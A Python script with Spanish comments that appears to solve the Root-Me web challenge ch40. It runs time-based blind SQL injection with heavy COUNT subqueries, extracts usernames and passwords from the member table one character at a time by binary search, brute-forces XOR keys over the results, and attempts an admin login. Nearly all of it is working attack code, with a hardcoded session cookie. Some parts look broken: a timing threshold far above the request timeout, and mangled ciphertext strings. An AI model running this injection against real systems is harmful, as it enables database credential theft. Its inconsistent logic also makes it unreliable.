#!/usr/bin/env python3
"""
SQL INJECTION TIME-BASED - ROOT-ME CH40
VERSIÓN 16 - DESCIFRANDO DATOS
"""
import requests
import time
import statistics
import base64

URL = "http://challenge01.root-me.org/web-serveur/ch40/"
COOKIE = {"PHPSESSID": "fbf0fdc633505f66eef3f20808f0d1ce"}

class TimeBasedSQLInjector:
    def __init__(self):
        self.session = requests.Session()
        self.session.cookies.update(COOKIE)
        self.baseline = 29.48
        self.threshold = 31.48
        self.heavy = "(SELECT COUNT(*) FROM users, users T1, users T2)"
        
    def test_payload(self, payload, repeats=5):
        tiempos = []
        params = {"action": "member", "member": payload}
        for _ in range(repeats):
            inicio = time.perf_counter_ns()
            try:
                r = self.session.get(URL, params=params, timeout=5)
                tiempo = (time.perf_counter_ns() - inicio) / 1_000_000
                tiempos.append(tiempo)
            except:
                tiempos.append(0)
            time.sleep(0.05)
        return statistics.median(tiempos) if tiempos else 0
    
    def is_true(self, condition, repeats=3):
        payload = f"1 OR ({condition}) OR {self.heavy}"
        t = self.test_payload(payload, repeats=repeats)
        return t < self.threshold
    
    def extract_char_at_position(self, query, pos):
        low, high = 32, 126
        while low <= high:
            mid = (low + high) // 2
            cond = f"ASCII(SUBSTRING(({query}), {pos}, 1)) > {mid}"
            if self.is_true(cond, repeats=2):
                low = mid + 1
            else:
                high = mid - 1
        return chr(low)
    
    def extract_string(self, query, label="Extrayendo", max_len=50):
        print(f"\n[*] {label}...")
        result = ""
        for pos in range(1, max_len + 1):
            char = self.extract_char_at_position(query, pos)
            result += char
            print(f"  [{pos}] '{char}' (ASCII: {ord(char)})")
            if ord(char) == 0 or ord(char) == 32:
                break
        return result

# EJECUCIÓN
injector = TimeBasedSQLInjector()

print("="*70)
print("  DESCIFRANDO DATOS DE LA BASE DE DATOS")
print("="*70)

# 1. Extraer datos cifrados
print("\n[1] Extrayendo datos cifrados:")

# Usuarios cifrados
cifrado_users = []
for i in range(1, 4):
    query = f"SELECT user FROM member WHERE id={i}"
    cifrado = injector.extract_string(query, f"Usuario ID={i} (cifrado)")
    cifrado_users.append(cifrado)
    print(f"  ID {i}: '{cifrado}'")

# Contraseñas cifradas
cifrado_passwords = []
for i in range(1, 4):
    query = f"SELECT password FROM member WHERE id={i}"
    cifrado = injector.extract_string(query, f"Contraseña ID={i} (cifrado)")
    cifrado_passwords.append(cifrado)
    print(f"  ID {i}: '{cifrado}'")

# Admin cifrado
admin_cifrado = injector.extract_string(
    "SELECT user FROM member WHERE user='admin'",
    "Admin (cifrado)"
)
print(f"  Admin cifrado: '{admin_cifrado}'")

admin_pass_cifrado = injector.extract_string(
    "SELECT password FROM member WHERE user='admin'",
    "Contraseña Admin (cifrado)"
)
print(f"  Contraseña Admin cifrada: '{admin_pass_cifrado}'")

# 2. Intentar descifrar con XOR
print("\n[2] Intentando descifrar con XOR:")

# Valores conocidos (descifrados)
plain_users = ['admin', 'jsilver', 'jsparow']
cifrado_users = ['# ', ',8Jb ', '! ']

for i, (plain, cifrado) in enumerate(zip(plain_users, cifrado_users), 1):
    print(f"\n  ID {i}:")
    print(f"    Cifrado: '{cifrado}'")
    print(f"    Plano:   '{plain}'")
    
    # Calcular clave XOR
    print("    Clave XOR (por posición):")
    for pos in range(min(len(plain), len(cifrado))):
        xor_key = ord(plain[pos]) ^ ord(cifrado[pos])
        print(f"      Pos {pos}: {ord(plain[pos])} XOR {ord(cifrado[pos])} = {xor_key}")

# 3. Intentar diferentes cifrados
print("\n[3] Probando diferentes métodos de descifrado:")

def xor_decrypt(data, key):
    """Descifra XOR con una clave"""
    result = ""
    for i, char in enumerate(data):
        if char == ' ':
            break
        result += chr(ord(char) ^ key)
    return result

# Probar diferentes claves XOR
for key in range(1, 256):
    for cifrado in cifrado_users:
        descifrado = xor_decrypt(cifrado, key)
        if descifrado in plain_users:
            print(f"  ¡Clave XOR encontrada! Key = {key}")
            print(f"    Cifrado: '{cifrado}' -> Descifrado: '{descifrado}'")
            break

# 4. Intentar descifrar la contraseña del admin
if admin_pass_cifrado:
    print("\n[4] Descifrando contraseña del admin:")
    
    # Si encontramos la clave XOR, descifrar la contraseña
    for key in range(1, 256):
        descifrado = xor_decrypt(admin_pass_cifrado, key)
        if len(descifrado) > 0 and all(32 <= ord(c) <= 126 for c in descifrado):
            print(f"  Con clave {key}: '{descifrado}'")
            # Verificar con la página
            data = {"username": "admin", "password": descifrado}
            r = requests.post(URL + "?action=login", data=data, cookies=injector.session.cookies)
            if "Authentification error" not in r.text:
                print(f"  ✅ ¡CONTRASEÑA ENCONTRADA! Key = {key}")
                print(f"  Contraseña: {descifrado}")
                break

print("\n" + "="*70)
print("  DATOS EXTRAÍDOS")
print("="*70)
print(f"Usuarios cifrados: {cifrado_users}")
print(f"Usuarios reales:   {plain_users}")
print(f"Admin cifrado:     '{admin_cifrado}'")
print(f"Contraseña cifrada: '{admin_pass_cifrado}'")
